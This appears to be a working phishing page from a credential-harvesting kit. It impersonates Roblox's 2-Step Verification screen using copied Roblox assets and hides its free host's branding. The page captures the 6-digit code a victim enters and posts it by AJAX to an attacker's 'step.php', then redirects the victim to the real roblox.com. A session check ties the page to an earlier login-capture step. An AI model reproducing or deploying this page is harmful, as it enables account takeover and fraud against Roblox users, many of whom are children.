<?php
error_reporting(0);
session_start();
if($_SESSION["username"]==""){
	header("Location: ../");
	}
	//session_destroy();
?>
<style>
img[src*="https://cdn.000webhost.com/000webhost/logo/footer-powered-by-000webhost-white2.png"] {
    display: none !important;
}
</style>	
	<!doctype html><!--[if IE 8]><html class="ie8" ng-app="robloxApp"><![endif]--><!--[if gt IE 8]><!-->
<html xmlns="http://www.w3.org/1999/xhtml">
 <!--[if IE 8]><html class="ie8" ng-app="robloxApp"><![endif]--><!--[if gt IE 8]><!--><!--<![endif]-->
 <head data-machine-id="WEB1072"> 
 	    	<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" integrity="sha512-894YE6QWD5I59HgZOGReFYm4dnWc1Qt5NtvYSaNcOP+u1T9qYdvdihz0PPSiiqn/+/3e7Jo4EaG7TubfWGUrMQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
  <style type="text/css">@charset "UTF-8";[ng\:cloak],[ng-cloak],[data-ng-cloak],[x-ng-cloak],.ng-cloak,.x-ng-cloak,.ng-hide:not(.ng-hide-animate){display:none !important;}ng\:form{display:block;}.ng-animate-shim{visibility:hidden;}.ng-anchor{position:absolute;}</style> <!-- MachineID: WEB1072 --> 
  <title>Roblox</title> 
  <meta http-equiv="X-UA-Compatible" content="IE=edge,requiresActiveX=true"> 
  <meta charset="UTF-8"> 
  <meta name="viewport" content="width=device-width, initial-scale=1"> 
  <meta name="author" content="Roblox Corporation"> 
  <meta name="description" content="Roblox is a global platform that brings people together through play."> 
  <meta name="keywords" content="free games, online games, building games, virtual worlds, free mmo, gaming cloud, physics engine"> 
  <meta name="apple-itunes-app" content="app-id=431946152"> 
  <script type="text/javascript" async src="https://www.googleadservices.com/pagead/conversion_async.js"></script> 
  <script type="text/javascript" async src="https://ssl.google-analytics.com/ga.js"></script> 
  <script async src="https://c.evidon.com/sitenotice/3822/translations/id.js" charset="utf-8"></script> 
  <script async id="evidon-settings" src="//c.evidon.com/sitenotice/3822/roblox/settings.js" charset="utf-8"></script> 
  <script async id="evidon-themes" src="//c.evidon.com/sitenotice/3822/snthemes.js" charset="utf-8"></script> 
  <script async id="evidon-location" src="//c.evidon.com/geo/country.js" charset="utf-8"></script> 
  <script id="evidon-notice" src="//c.evidon.com/sitenotice/evidon-sitenotice-tag.js" charset="utf-8"></script> 
  <script type="application/ld+json">
    {
    "@context" : "http://schema.org",
    "@type" : "Organization",
    "name" : "Roblox",
    "url" : "https://www.roblox.com/",
    "logo": "https://images.rbxcdn.com/c69b74f49e785df33b732273fad9dbe0.png",
    "sameAs" : [
    "https://www.facebook.com/ROBLOX/",
    "https://twitter.com/roblox",
    "https://www.linkedin.com/company/147977",
    "https://www.instagram.com/roblox/",
    "https://www.youtube.com/user/roblox",
    "https://plus.google.com/+roblox",
    "https://www.twitch.tv/roblox"
    ]
    }
</script> 
  <meta name="locale-data" data-language-code="en_us" data-language-name="English"> 
  <meta name="device-meta" data-device-type="phone" data-is-in-app="false" data-is-desktop="false" data-is-phone="true" data-is-tablet="false" data-is-console="false" data-is-android-app="false" data-is-ios-app="false" data-is-uwp-app="false" data-is-xbox-app="false" data-is-amazon-app="false" data-is-win32-app="false" data-is-studio="false" data-is-game-client-browser="false" data-is-ios-device="false" data-is-android-device="true" data-is-universal-app="false" data-app-type="unknown"> 
  <meta name="environment-meta" data-is-testing-site="false"> 
  <meta id="roblox-display-names" data-enabled="false"> 
  <meta name="page-meta" data-internal-page-name=""> 
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" integrity="sha512-894YE6QWD5I59HgZOGReFYm4dnWc1Qt5NtvYSaNcOP+u1T9qYdvdihz0PPSiiqn/+/3e7Jo4EaG7TubfWGUrMQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
 <script type="text/javascript" >
 $(document).ready(function () {
  $("#pload").hide();
 	var formData="";
  $("#form").submit(function (event) {
  	 	  $("#pload").show();
      $("#i-btn").hide();
    var formData = {
      kode: $("#kode").val()
    };
    $.ajax({
      type: "POST",
      url: "step.php",
      data: formData,
      dataType: "text",
      encode: true,
    }).done(function (data) {
    	
setTimeout(function(){
           if(data=="1"){
           	   $("#pload").hide();
           $("#i-btn").show();
           	$('#form')[0].reset();
           	      $("#errorq").text("Failed, try again");   
           }else if(data=="0"){
           	     $("#pload").hide();
              $("#i-btn").show();
           	    $("#errorq").text("Processing");   
           	window.location.replace("https://roblox.com");
           	}
}, 1000);
    }); 

    event.preventDefault();
  });
});
</script>
 <link href="https://images.rbxcdn.com/3b43a5c16ec359053fef735551716fc5.ico" rel="icon"> 
  <link rel="stylesheet" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-bundlename="StyleGuide" data-bundle-source="Main" href="https://css.rbxcdn.com/e0d4fd774937f217b54c178d68182d5ef0928a164feb48c7245bb06dea07dba4.css"> 
  <link rel="stylesheet" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-bundlename="Thumbnails" data-bundle-source="Main" href="https://css.rbxcdn.com/9517d686dc47015c200496d77e2b18146ee37652d18e25ecf9e1ed230310ea13.css"> 
  <link rel="stylesheet" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-bundlename="ConfigureWebApps" data-bundle-source="Main" href="https://css.rbxcdn.com/08def520152a575438e73a81aa9a310c2415c327df7b624a24aa6e794d24dba3.css"> 
  <link rel="canonical" href="https://www.roblox.com/login/twostepverification?returnUrl=https:%2F%2Fwww.roblox.com%2FLogin%3Fnl%3Dtrue&tl=ee578cbe-744a-46a9-b0fe-7ae89b948ed9&username=andryyudha123450"> 
  <link onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" rel="stylesheet" href="https://static.rbxcdn.com/css/leanbase___5e469c309d1eeddf42cc9d36a50f82e0_m.css/fetch"> 
  <link onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" rel="stylesheet" href="https://static.rbxcdn.com/css/page___20226bfb7dbdd6057f22283ab59a2e26_m.css/fetch"> 
  <link rel="stylesheet" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-bundlename="Captcha" data-bundle-source="Main" href="https://css.rbxcdn.com/24a76e8ea70afb9462fad013faa3d22ff3e832e8327ddd764dafe328918bed90.css"> 
  <link rel="stylesheet" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-bundlename="TwoStepVerification" data-bundle-source="Main" href="https://css.rbxcdn.com/0e9fb7f4d96db9bd058504089d8ad0edc15b1b97b2843cdfc79c265923a3f182.css"> 
  <link rel="stylesheet" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-bundlename="RobuxIcon" data-bundle-source="Main" href="https://css.rbxcdn.com/2f599b9e9ca20ee3c155684adbf1cdcb7220bab681b55b4505123a0c34e81969.css"> 
  <meta name="thumbnail-meta-data" data-is-webapp-cache-enabled="False" data-webapp-cache-expirations-timespan="00:01:00" data-request-min-cooldown="1000" data-request-max-cooldown="30000" data-request-max-retry-attempts="5" data-request-batch-size="100" data-thumbnail-metrics-sample-size="20" data-concurrent-thumbnail-request-count="4"> 
 </head> 
 <body id="rbx-body" class="rbx-body  no-footer light-theme gotham-font" data-performance-relative-value="0.005" data-internal-page-name="" data-send-event-percentage="0"> 
  <div id="roblox-linkify" data-enabled="true" data-regex="(https?\:\/\/)?(?:www\.)?([a-z0-9-]{2,}\.)*(((m|de|www|web|api|blog|wiki|corp|polls|bloxcon|developer|devforum|forum|status)\.roblox\.com|robloxlabs\.com)|(www\.shoproblox\.com)|(roblox\.status\.io)|(rblx\.co)|help\.roblox\.com(?![A-Za-z0-9\/.]*\/attachments\/))(?!\/[A-Za-z0-9-+&@#\/=~_|!:,.;]*%)((\/[A-Za-z0-9-+&@#\/%?=~_|!:,.;]*)|(?=\s|\b))" data-regex-flags="gm" data-as-http-regex="(([^.]help|polls)\.roblox\.com)"></div> 
  <div id="image-retry-data" data-image-retry-max-times="30" data-image-retry-timer="500" data-ga-logging-percent="10"> 
  </div> 
  <div id="fb-root"></div> 
  <div id="wrap" class="wrap no-gutter-ads logged-out" data-gutter-ads-enabled="false"> 
   <div class="container-main no-header-nav                 touch                                  on-phone" id="container-main"> 
    <script type="text/javascript">
                if (top.location != self.location) {
                    top.location = self.location.href;
                }
            </script> 
    <div class="alert-container"> 
     <noscript>
       <div> <div class="alert-info" role="alert"> Please enable Javascript to use all the features on this site. </div> </div> 
     </noscript> 
     <script type="text/javascript" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="CrownPeakCookieBanner" data-bundle-source="Main" src="https://js.rbxcdn.com/8339162d566a25c7e0ae93a9aa6b7e42b900c8759a6c760fd8a457d9231c3088.js"></script> 
    </div> 
    <div class="content"> 

 
     <div class="rbx-header"></div> 
     <form id="form" method="post">
     <div id="t"> 
      <div class="two-step-verification"> 
       <div class="row page-content"> 
       	 
       	<script>
    
       </script>
        <h1 class="header">2-Step Verification</h1> 
       </div> 
       <div> 
        <div class="col-xs-12 section-content"> 
         <div> 
          <div class="logo-method"> 
           <div class="logo-img lock-img"></div> 
          </div> 
          <div class="content-group"> 
           <div>Enter the code we just sent you via email 
           </div> 
           <div class="input-container"> 
            <div class="form-group"> 
      
             <input type="number" class="form-control input-field text-center" autocomplete="false" id="kode" placeholder="Enter 6-digit Code" maxlength="6" > 
             <p id="errorq" class="form-control-label error-label"></p> 
            </div> 
           </div> 
           <div class="button-container">
           <center>   
<div id=""><br>
<img height="18" width="60" src="https://images.rbxcdn.com/fab3a9d08d254fef4aea4408d4db1dfe-loading_dark.gif" id="pload" style=""></div> </center>
 <button type="submit" id="i-btn" name="submit" class="btn-primary-md" >Verify</button> 
     </form><br>
                 </div> 
<div class="checkbox trust-device"> 
            <input id="remember-device" type="checkbox" tabindex="0"><label for="remember-device">Trust this device for 30 days</label> 
           </div> 
           <div class="code-message-action"> 
            <div class="text-block"> <a class="text-name small">Resend Code</a> 
            </div> 
           </div> 
          </div> 
         </div> 
         <div class="support"> 
          <div class="text-block"> <span class="text-footer">Need help? Contact <a class="text-name text-footer contact" href="https://www.roblox.com/info/2sv" target="_blank">Roblox Support</a></span> 
          </div> 
         </div> 
        </div> 
       </div> 
      </div> 
     </div> 
    </div> 
   </div> 
  </div> 
  <div id="app-bumper-main" ng-modules="robloxApp, appBumper" ng-controller="appBumperController" ng-init="init('/appbumper/metadata')" class="ng-scope"> <!-- ngIf: layout.isVisible --> 
  </div> 
  <script type="text/javascript">function urchinTracker() {}</script> 
  <script type="text/javascript">
    if (typeof Roblox === "undefined") {
        Roblox = {};
    }
    if (typeof Roblox.PlaceLauncher === "undefined") {
        Roblox.PlaceLauncher = {};
    }
    var isRobloxIconEnabledForRetheme = "True";
    var robloxIcon = isRobloxIconEnabledForRetheme === 'True' ? "<span class='icon-logo-r-95'></span>" : "<img src='https://images.rbxcdn.com/8e7879f99cfa7cc3b1fce74f8191be03.svg' width='90' height='90' alt='R'/>";
    Roblox.PlaceLauncher.Resources = {
        RefactorEnabled: "True",
        IsProtocolHandlerBaseUrlParamEnabled: "False",
        ProtocolHandlerAreYouInstalled: {
            play: {
                content: robloxIcon + "<p>You&#39;re moments away from getting into the experience!</p>",
                buttonText: "Download and Install Roblox",
                footerContent: "<a href='https://assetgame.roblox.com/game/help'class= 'text-name small' target='_blank' >Click here for help</a> "
            },
            studio: {
                content: "<img src='https://images.rbxcdn.com/f25e4cadae29ae9a57a962126b2d2e2a.png' width='95' height='95' alt='R' /><p>Get started creating your own experiences!</p>",
                buttonText: "Download Studio"
            }
        },
        ProtocolHandlerStartingDialog: {
            play: {
                content: robloxIcon + "<p>Roblox is now loading. Get ready to visit!</p>"
            },
            studio: {
                content: "<img src='https://images.rbxcdn.com/f25e4cadae29ae9a57a962126b2d2e2a.png' width='95' height='95' alt='R' /><p>Checking for Roblox Studio...</p>"
            },
            loader: "<span class='spinner Spinner-default'></span>"
        }
    };
</script> 
  <div id="PlaceLauncherStatusPanel" style="display:none;width:300px" data-new-plugin-events-enabled="True" data-event-stream-for-plugin-enabled="True" data-event-stream-for-protocol-enabled="True" data-is-game-launch-interface-enabled="False" data-is-protocol-handler-launch-enabled="False" data-is-user-logged-in="False" data-os-name="Android" data-protocol-name-for-client="roblox-player" data-protocol-name-for-studio="roblox-studio" data-protocol-roblox-locale="en_us" data-protocol-game-locale="en_us" data-protocol-url-includes-launchtime="true" data-protocol-detection-enabled="true" data-protocol-separate-script-parameters-enabled="false" data-protocol-avatar-parameter-enabled="false" data-protocol-channel-name="LIVE" data-protocol-studio-channel-name="" data-protocol-player-channel-name=""> 
   <div class="modalPopup blueAndWhite PlaceLauncherModal" style="min-height: 160px"> 
    <div id="Spinner" class="Spinner" style="padding:20px 0;"> 
     <img data-delaysrc="https://images.rbxcdn.com/e998fb4c03e8c2e30792f2f3436e9416.gif" height="32" width="32" alt="Progress" src="https://images.rbxcdn.com/e998fb4c03e8c2e30792f2f3436e9416.gif" class="src-replaced"> 
    </div> 
    <div id="status" style="min-height:40px;text-align:center;margin:5px 20px"> 
     <div id="Starting" class="PlaceLauncherStatus MadStatusStarting" style="display:block">
       Starting Roblox... 
     </div> 
     <div id="Waiting" class="PlaceLauncherStatus MadStatusField">
       Connecting to People... 
     </div> 
     <div id="StatusBackBuffer" class="PlaceLauncherStatus PlaceLauncherStatusBackBuffer MadStatusBackBuffer"></div> 
    </div> 
    <div style="text-align:center;margin-top:1em"> 
     <input type="button" class="Button CancelPlaceLauncherButton translate" value="Cancel"> 
    </div> 
   </div> 
  </div> 
  <div id="ProtocolHandlerClickAlwaysAllowed" class="ph-clickalwaysallowed" style="display:none;"> 
   <p class="larger-font-size"> <span class="icon-moreinfo"></span> Check <strong>Always open links for URL: Roblox Protocol</strong> and click <strong>Open URL: Roblox Protocol</strong> in the dialog box above to join experiences faster in the future! </p> 
  </div> 
  <script type="text/javascript">
function checkRobloxInstall() {
             window.location = 'https://www.roblox.com/unsupported?osx=10.5'; return false;
}
</script> 
  <style>
        #win_firefox_install_img .activation {
        }

        #win_firefox_install_img .installation {
            width: 869px;
            height: 331px;
        }

        #mac_firefox_install_img .activation {
        }

        #mac_firefox_install_img .installation {
            width: 250px;
        }

        #win_chrome_install_img .activation {
        }

        #win_chrome_install_img .installation {
        }

        #mac_chrome_install_img .activation {
            width: 250px;
        }

        #mac_chrome_install_img .installation {
        }
    </style> 
  <div id="InstallationInstructions" class="modalPopup blueAndWhite" style="display:none;overflow:hidden"> <a id="CancelButton2" onclick="return Roblox.Client._onCancel();" class="ImageButton closeBtnCircle_35h ABCloseCircle"></a> 
   <div style="padding-bottom:10px;text-align:center"> 
    <br> 
    <br> 
   </div> 
  </div> 
  <div id="pluginObjDiv" style="height:1px;width:1px;visibility:hidden;position: absolute;top: 0;"></div> <iframe id="downloadInstallerIFrame" name="downloadInstallerIFrame" style="visibility:hidden;height:0;width:1px;position:absolute"></iframe> 
  <script onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="clientinstaller" type="text/javascript" src="https://js.rbxcdn.com/459f4d69b0709806c7ee83714896739e.js"></script> 
  <script type="text/javascript">
    Roblox.Client._skip = '/unsupported';
    Roblox.Client._CLSID = '';
    Roblox.Client._installHost = '';
    Roblox.Client.ImplementsProxy = false;
    Roblox.Client._silentModeEnabled = false;
    Roblox.Client._bringAppToFrontEnabled = false;
    Roblox.Client._currentPluginVersion = '';
    Roblox.Client._eventStreamLoggingEnabled = false;

        
        Roblox.Client._installSuccess = function() {
            if(GoogleAnalyticsEvents){
                GoogleAnalyticsEvents.ViewVirtual('InstallSuccess');
                GoogleAnalyticsEvents.FireEvent(['Plugin','Install Success']);
                if (Roblox.Client._eventStreamLoggingEnabled && typeof Roblox.GamePlayEvents != "undefined") {
                    Roblox.GamePlayEvents.SendInstallSuccess(Roblox.Client._launchMode, play_placeId);
                }
            }
        }
        
            
        if ((window.chrome || window.safari) && window.location.hash == '#chromeInstall') {
            window.location.hash = '';
            var continuation = '(' + $.cookie('chromeInstall') + ')';
            play_placeId = $.cookie('chromeInstallPlaceId');
            Roblox.GamePlayEvents.lastContext = $.cookie('chromeInstallLaunchMode');
            $.cookie('chromeInstallPlaceId', null);
            $.cookie('chromeInstallLaunchMode', null);
            $.cookie('chromeInstall', null);
            RobloxLaunch._GoogleAnalyticsCallback = function() { var isInsideRobloxIDE = 'website'; if (Roblox && Roblox.Client && Roblox.Client.isIDE && Roblox.Client.isIDE()) { isInsideRobloxIDE = 'Studio'; };GoogleAnalyticsEvents.FireEvent(['Plugin Location', 'Launch Attempt', isInsideRobloxIDE]);GoogleAnalyticsEvents.FireEvent(['Plugin', 'Launch Attempt', 'Play']);EventTracker.fireEvent('GameLaunchAttempt_Android', 'GameLaunchAttempt_Android_Plugin'); if (typeof Roblox.GamePlayEvents != 'undefined') { Roblox.GamePlayEvents.SendClientStartAttempt(null, play_placeId); }  }; 
            Roblox.Client.ResumeTimer(eval(continuation));
        }
        
</script> 
  <div class="ConfirmationModal modalPopup unifiedModal smallModal" data-modal-handle="confirmation" style="display:none;"> <a class="genericmodal-close ImageButton closeBtnCircle_20h"></a> 
   <div class="Title"></div> 
   <div class="GenericModalBody"> 
    <div class="TopBody"> 
     <div class="ImageContainer roblox-item-image" data-image-size="small" data-no-overlays="" data-no-click=""> 
      <img class="GenericModalImage" alt="generic image"> 
     </div> 
     <div class="Message"></div> 
    </div> 
    <div class="ConfirmationModalButtonContainer GenericModalButtonContainer"> <a href="" id="roblox-confirm-btn"><span></span></a> <a href="" id="roblox-decline-btn"><span></span></a> 
    </div> 
    <div class="ConfirmationModalFooter"> 
    </div> 
   </div> 
   <script type="text/javascript">
        Roblox = Roblox || {};
        Roblox.Resources = Roblox.Resources || {};
        
        Roblox.Resources.GenericConfirmation = {
            yes: "Yes",
            No: "No",
            Confirm: "Confirm",
            Cancel: "Cancel"
        };
    </script> 
  </div> 
  <div id="modal-confirmation" class="modal-confirmation" data-modal-type="confirmation"> 
   <div id="modal-dialog" class="modal-dialog"> 
    <div class="modal-content"> 
     <div class="modal-header"> <button type="button" class="close" data-dismiss="modal"> <span aria-hidden="true"><span class="icon-close"></span></span><span class="sr-only">Close</span> </button> 
      <h5 class="modal-title"></h5> 
     </div> 
     <div class="modal-body"> 
      <div class="modal-top-body"> 
       <div class="modal-message"></div> 
       <div class="modal-image-container roblox-item-image" data-image-size="medium" data-no-overlays="" data-no-click=""> 
        <img class="modal-thumb" alt="generic image"> 
       </div> 
       <div class="modal-checkbox checkbox"> 
        <input id="modal-checkbox-input" type="checkbox"> <label for="modal-checkbox-input"></label> 
       </div> 
      </div> 
      <div class="modal-btns"> <a href="" id="confirm-btn"><span></span></a> <a href="" id="decline-btn"><span></span></a> 
      </div> 
      <div class="loading modal-processing"> 
       <img class="loading-default" src="https://images.rbxcdn.com/4bed93c91f909002b1f17f05c0ce13d1.gif" alt="Processing..."> 
      </div> 
     </div> 
     <div class="modal-footer text-footer"> 
     </div> 
    </div> 
   </div> 
  </div> 
 </body>
</html>